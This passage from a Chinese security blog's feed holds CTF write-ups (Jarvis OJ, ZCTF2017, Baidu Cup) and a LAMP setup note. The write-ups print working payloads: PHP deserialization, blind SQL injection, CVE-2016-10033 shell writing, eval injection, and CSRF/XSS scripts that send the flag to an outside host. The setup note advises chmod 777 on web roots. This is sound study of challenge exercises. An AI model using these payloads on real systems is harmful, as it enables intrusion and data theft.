found!"</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>通过GET传入一个img参数，然后经过base64解码不能包含<code>.. / pctf</code></p>
<pre><code>stripos ： 查找字符串首次出现的位置（不区分大小写）
readfile ： 输出文件
</code></pre><p>再查看下index.php得到<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</div><div class="line">	$x = <span class="keyword">new</span> Shield();</div><div class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</div><div class="line">		$x = unserialize($g);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
<p>包含一个shield.php，传入一个class参数且对其进行反序列化</p>
<pre><code>require_once ： 进行一次文件包含且如果文件已经被包含不会再次包含
unserialize ： 对单一的已序列化的变量进行操作，将其转换回 PHP 的值
</code></pre><p>继续查看下shield.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	<span class="comment">//flag is in pctf.php</span></div><div class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">		<span class="keyword">public</span> $file;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </div><div class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</div><div class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>发现在shield.php中有一个readfile方法那么就可以通过序列化创建一个shield对象然后在传给class参数，并且在index中进行反序列化，进而调用shield对象中的readfile方法。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</div><div class="line">        <span class="keyword">public</span> $file;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $shield = <span class="keyword">new</span> Shield(<span class="string">'pctf.php'</span>);</div><div class="line">    <span class="keyword">echo</span> serialize($shield);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>返回<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>传给class<br>最终payload为：</p>
<pre><code>http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ZCTF2017]]></title>
      <url>http://isron.cn/2017/03/01/ZCTF2017/</url>
      <content type="html"><![CDATA[<p>觉得ZCTF很难，自己还需要很大的努力<a id="more"></a></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h2><p>进去就一个ha？，当时没找到源码，别人给的，做完了才找到，其实就是<code>.index.php.swp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$flag = $_GET[<span class="string">'flag'</span>];</div><div class="line"><span class="keyword">if</span> ($flag != <span class="string">'15562'</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (strstr($flag, <span class="string">'zctf'</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (substr(md5($flag),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">			<span class="keyword">die</span>(<span class="string">'ZCTF&#123;#########&#125;'</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">die</span>(<span class="string">'ha?'</span>)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>就是一个md5的碰撞，写个脚本跑一下就有了<br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> <span class="built_in">string</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">string</span>.<span class="name">lowercase</span>:</div><div class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999</span>):</div><div class="line">                a=i+<span class="string">'zctf'</span>+str(z)</div><div class="line">                b=str(a)</div><div class="line">                c=hashlib.md5(b)</div><div class="line">                d=str(c.hexdigest())</div><div class="line">                <span class="keyword">if</span>(d[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>):</div><div class="line">                        zzz=d[<span class="number">10</span>:<span class="number">24</span>]</div><div class="line">                        zz=<span class="number">0</span></div><div class="line">                        <span class="keyword">for</span> ss <span class="keyword">in</span> <span class="name">zzz</span>:</div><div class="line">                                <span class="keyword">if</span> ss.isalpha():</div><div class="line">                                        zz+=<span class="number">1</span></div><div class="line">                        <span class="keyword">if</span> zz==<span class="number">0</span>:</div><div class="line">                                <span class="built_in">print</span> d</div><div class="line">                                <span class="built_in">print</span> b</div></pre></td></tr></table></figure></p>
<h2 id="Find-my-eyes"><a href="#Find-my-eyes" class="headerlink" title="Find my eyes"></a>Find my eyes</h2><p>当时没有做出来看了lorexxar的write up才知道CSP，当时做的时候除了在contact.php下留言会返回success，其他的都没有反应，而且存在CSP：通过CSP特定的语法对网站加载的资源进行限制。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy	</div><div class="line"><span class="keyword">default</span>-src <span class="string">'self'</span>; script-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>;</div><div class="line"><span class="keyword">default</span>-src <span class="string">'self'</span>: 只能使用自己的同源的js脚本。</div><div class="line">script-src <span class="string">'self'</span>： 同样是同源策略</div><div class="line"><span class="keyword">unsafe</span>-<span class="keyword">inline</span> : 只允许使用内联资源</div></pre></td></tr></table></figure></p>
<p>对过滤的函数进行FUZZ:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">eval</div><div class="line">document</div><div class="line"><span class="keyword">location</span></div><div class="line"><span class="title">href</span></div><div class="line">window</div><div class="line">src</div><div class="line">svg</div><div class="line">img</div><div class="line">open</div><div class="line">callback</div><div class="line">单双引号</div><div class="line">括号</div><div class="line">反斜杠</div><div class="line">$\<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<p>附上师傅们csp bypass的payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">//@ sourceMappingURL=http://0xb.pw</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy apk"></a>easy apk</h2><p>当时没做出来，也没什么头绪，看了write up发现就是一个注入题目和CVE-2016-10033的利用，通过测试发现过滤掉了<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(</div><div class="line">)</div><div class="line">&amp;</div><div class="line">|</div><div class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span></span></div><div class="line">from</div><div class="line">password</div></pre></td></tr></table></figure></p>
<p>而且过滤的是union+select,那么就利用<code>union distinct select</code>绕过过滤，附上HeartSky师傅的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(name)</span>:</span> </div><div class="line">    key = <span class="string">"1470"</span>*<span class="number">100</span></div><div class="line">    name =  <span class="string">''</span>.join(reversed(list(name)))</div><div class="line">    tmp=[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(name)):</div><div class="line">        tmp.append(hex(ord(name[i])^ord(key[i]))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line"></div><div class="line">    enc = <span class="string">''</span>.join(tmp)</div><div class="line">    <span class="keyword">return</span> enc</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></div><div class="line">    password = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</div><div class="line">            name = <span class="string">"admin' union distinct select 1,'test','"</span> + password + chr(j) + <span class="string">"' order by 3 desc#"</span></div><div class="line">            enc = encrypt(name)</div><div class="line">            payload = &#123;<span class="string">'username'</span>:enc, <span class="string">'password'</span>:<span class="number">111</span>&#125;</div><div class="line">            r = requests.post(<span class="string">'http://58.213.63.30:10005'</span>, data=payload)</div><div class="line">            <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> r.text:</div><div class="line">                password += chr(j<span class="number">-1</span>)</div><div class="line">                <span class="keyword">print</span> password</div><div class="line">                <span class="keyword">break</span>           </div><div class="line"></div><div class="line"><span class="comment"># print encrypt("admin' union distinct select 0,2,3 order by 1 asc#")</span></div><div class="line">getPassword()</div></pre></td></tr></table></figure></p>
<p>得到密码登录之后就利用CVE-2016-10033漏洞进行写入<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a( -X<span class="regexp">/var/</span>www<span class="regexp">/html/</span>upload<span class="regexp">/test.php -OQueueDirectory=/</span>tmp )<span class="meta">@qq</span>.com</div></pre></td></tr></table></figure></p>
<p>访问得到flag</p>
<h2 id="onlymyself"><a href="#onlymyself" class="headerlink" title="onlymyself"></a>onlymyself</h2><p>看不太懂，主要知识点包含了CSRF，XSS记一下fp的CSRF脚本与通过search.php枚举flag.<br>CSRF:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;form <span class="built_in">id</span>=<span class="string">"ffrom"</span> action=<span class="string">"http://58.213.63.30:10003/checkProfile.php"</span> method=<span class="string">"POST"</span> <span class="built_in">id</span>=<span class="string">"profile"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">&lt;input type=<span class="string">"file"</span> <span class="built_in">id</span>=<span class="string">"image"</span> <span class="built_in">name</span>=<span class="string">"image"</span> data-filename-placement=<span class="string">"inside"</span> style=<span class="string">"left: -179.99px; top: 19.3333px;"</span>&gt;&lt;/a&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"nick"</span> <span class="built_in">id</span>=<span class="string">"nick"</span> value=<span class="string">"&lt;scriimgpt src=//xss.site/1.js&gt;/*"</span>&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"age"</span> <span class="built_in">id</span>=<span class="string">"age"</span> value =<span class="string">"2"</span>&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"address"</span> <span class="built_in">id</span>=<span class="string">"address"</span> value=<span class="string">"&lt;/scripimgt&gt;"</span>&gt;</div><div class="line">&lt;input <span class="built_in">class</span>=<span class="string">"btn btn-primary"</span> <span class="built_in">id</span>=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"submit"</span> type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;<span class="keyword">script</span>&gt;submit.click()&lt;/<span class="keyword">script</span>&gt;</div></pre></td></tr></table></figure></p>
<p>seaech:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">tab=<span class="string">"_0123456789abcdefghijklmnopqrstuvwxyz&#125;"</span></div><div class="line"><span class="built_in">str</span>=<span class="string">''</span></div><div class="line">$.ajaxSettings.async=<span class="literal">false</span></div><div class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</div><div class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;tab.length;i++)&#123;</div><div class="line">    <span class="comment">//console.log(tab[i]);</span></div><div class="line">    <span class="built_in">flag</span>=<span class="literal">false</span></div><div class="line">    x=$.get(<span class="string">'http://58.213.63.30:10003/search.php?keywords=zctf&#123;'</span>+<span class="built_in">str</span>+<span class="string">'\'</span>+tab[i]);</div><div class="line">    <span class="keyword">if</span>(x.status==<span class="number">404</span>) <span class="built_in">flag</span>=<span class="literal">true</span>;</div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">flag</span>) break;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">str</span>+=tab[i];</div><div class="line">  console.<span class="built_in">log</span>(<span class="built_in">str</span>);</div><div class="line">  <span class="keyword">if</span>(tab[i]==<span class="string">'&#125;'</span>) break;</div><div class="line">&#125;</div><div class="line"><span class="built_in">location</span>.href=’<span class="comment">//xss.site’+str</span></div></pre></td></tr></table></figure></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Russian-Zip"><a href="#Russian-Zip" class="headerlink" title="Russian Zip"></a>Russian Zip</h2><p>打开发现提示要密码，也没给关于密码的Hint，想到可能是伪加密，利用zip修复工具，就可修复伪加密，也可以利用十六进制工具对文件头的加密标志位做修改<a href="http://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="external">zip伪加密</a>打开发现是我的世界的存档，加载一下出flag</p>
<h2 id="whisper"><a href="#whisper" class="headerlink" title="whisper"></a>whisper</h2><p>用winhex打开hint发现后面一大串base64代码，复制下来利用python去解<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line"><span class="keyword">a</span> = <span class="built_in">open</span>(<span class="string">'AA.txt'</span>,<span class="string">'rb'</span>)</div><div class="line">b = <span class="keyword">a</span>.<span class="built_in">read</span>()</div><div class="line">c = base64.b64decode(b)</div><div class="line">f = <span class="built_in">open</span>(<span class="string">'BB.txt'</span>,<span class="string">'w'</span>)</div><div class="line">f.<span class="built_in">write</span>(c)</div><div class="line">f.<span class="built_in">close</span>()</div></pre></td></tr></table></figure></p>
<p>发现失败了，后来看了大佬的write up才发现前面多了一个E。。。解开之后利用<code>binwalk -e</code><br><img src="http://p1.bqimg.com/567571/ac0119c72d4ee393.png" alt=""><br>提取文件然后<code>cat *</code>查找下password得到密码打开压缩包获得flag<br><img src="http://i1.piimg.com/567571/f772dc1795c208e3.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[百度杯二月第二场]]></title>
      <url>http://isron.cn/2017/02/22/baidu_php/</url>
      <content type="html"><![CDATA[<p>这次前三个题目代码都很短，然而还是要好好研究，自己并不怎么会<br><a id="more"></a></p>
<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC-1"></a>MISC-1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; <span class="comment">//包含flag.php</span></div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>$_REQUEST与$_POST,$_GET都用于PHP接受表单。</p>
<ul>
<li>$_REQUEST具有$_POST $_GET的功能,但是$_REQUEST比较慢。通过post和get方法提交的所有数据都可以通过$_REQUEST数组获得</li>
<li>$_GET安全性较低，传送数据量较小，get传输的数据在URL当中能够看到</li>
<li>$_POST安全性较高，传送数据量较大，一般默认为不受限制，用户看不到数据的传送</li>
</ul>
<p>preg_match() 函数用于进行正则表达式匹配</p>
<pre><code>语法：preg_match (pattern , subject, matches)
</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td>正则表达式</td>
</tr>
<tr>
<td>subject</td>
<td>需要匹配的检索对象</td>
</tr>
<tr>
<td>matches</td>
<td>可选，存储匹配结果的数组</td>
</tr>
</tbody>
</table>
<pre><code>\w：匹配字母或数字或下划线或汉字
if(!preg_match(&apos;/^\w*$/&apos;,$a )){ //当匹配不到上述信息时执行ERROR
</code></pre><p>题目说flag在某六位变量中,所以使用超全局变量$GLOBALS将所有的全局变量输出出来。</p>
<pre><code>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量
</code></pre><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC-2"></a>MISC-2</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>提示flag不在变量中，那么可以根据eval的特性</p>
<pre><code>语法：eval(phpcode)
</code></pre><p>进行代码执行</p>
<pre><code>?hello=);echo `cat flag.php`;//
eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
</code></pre><p>闭合前面的括号执行后面的cat flag.php得到flag</p>
<h2 id="MISC-3"><a href="#MISC-3" class="headerlink" title="MISC-3"></a>MISC-3</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</div><div class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</div><div class="line">  $_SESSION[<span class="string">'time'</span>] = time();</div><div class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</div><div class="line">  session_destroy();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$value = $_REQUEST[<span class="string">'value'</span>];</div><div class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</div><div class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</div><div class="line">  $_SESSION[<span class="string">'nums'</span>]++;</div><div class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</div><div class="line">  <span class="keyword">echo</span> $str_rands;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>根据源码可知当<code>SESSION[&#39;nums&#39;]&gt;=10</code>大于等于10时输出源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</div><div class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</div><div class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>substr(md5($value),5,4)==0)恒成立，在对字符串进行类型转换时会被转换成0。为了防止这种情况发生最好采用<code>===</code><br>构造payload<code>?value[0]=e&amp;value[1]=a</code>使nums++且输出下一个whoami的值.累加得到flag</p>
<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</div><div class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>很明显的文件包含漏洞，在查看PHPinfo时发现<br><img src="http://i1.piimg.com/567571/ad6ff750d73df4bc.png" alt=""><br>那么就可以利用php://input进行代码执行<br><img src="http://p1.bqimg.com/567571/344b6ecdf4830adc.png" alt=""><br>然后<code>cat dle345aae.php</code>得到flag</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu下LAMP的环境配置]]></title>
      <url>http://isron.cn/2016/12/01/ubuntu_lamp/</url>
      <content type="html"><![CDATA[<p>由于自己比较菜，搭一个LAMP环境搭了两个星期，记录一下自己用的命令，方便查看。<br><a id="more"></a><br>所用Linux版本：Ubuntu14.04<br>Apache：<code>sudo apt-get install Apache2-bin -y</code><br>Mysql：<code>sudo apt-get install Mysql-Server Mysql-client -y</code><br>PHP：<code>sudo apt-get install PHP5 -y</code><br>其他模块：<code>sudo apt-get install libapache2-mod-php5 libapache2-mod-auth-mysql php5-mysql php5-gd</code><br>给予目录777权限：<code>chmod 777 /var/www</code> <code>chmod 777 /var/www/html</code><br>安装phpmyadmin：<code>sudo apt-get install phpmyadmin</code>选择Apache2<br>利用ln命令将phpmyadmin与html建立连接：<code>ln -s /usr/share/phpmyadmin /var/www/html</code><br>然后直接运行<code>http://ip地址/phpmyadmin</code>即可<br>mysql_test测试代码：</p>
<pre><code>&lt;?php

$link = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;password&quot;);if(!$link)

die(&apos;Could not connect: &apos; . mysql_error());

else

echo &quot;Mysql 配置正确!&quot;;

mysql_close($link);

?&gt;
</code></pre><p>如果出现乱码在配置文件sudo gedit /etc/apache2/apache2.conf&amp;添加如下代码：AddDefaultCharset UTF-8加上这句后重新启动apache2服务，生效。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些感想]]></title>
      <url>http://isron.cn/2016/11/17/more_thoughts/</url>
